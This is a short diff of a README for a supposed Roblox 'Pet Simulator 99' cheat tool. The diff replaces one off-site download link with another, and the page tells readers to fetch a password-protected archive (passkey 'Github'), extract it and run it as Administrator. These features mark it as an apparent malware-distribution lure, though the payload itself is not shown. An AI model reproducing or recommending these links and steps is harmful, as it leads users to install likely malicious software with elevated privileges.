@@ -6,7 +6,7 @@ Pet Simulator 99 utility with auto-farm, pet spawner, unlock all pets, auto-hatc
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -76,7 +76,7 @@ This tool automates farming, pet spawning, hatching, and diamond hacking to enha
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Roblox and join Pet Simulator 99.
 4. Run the tool **as Administrator**.
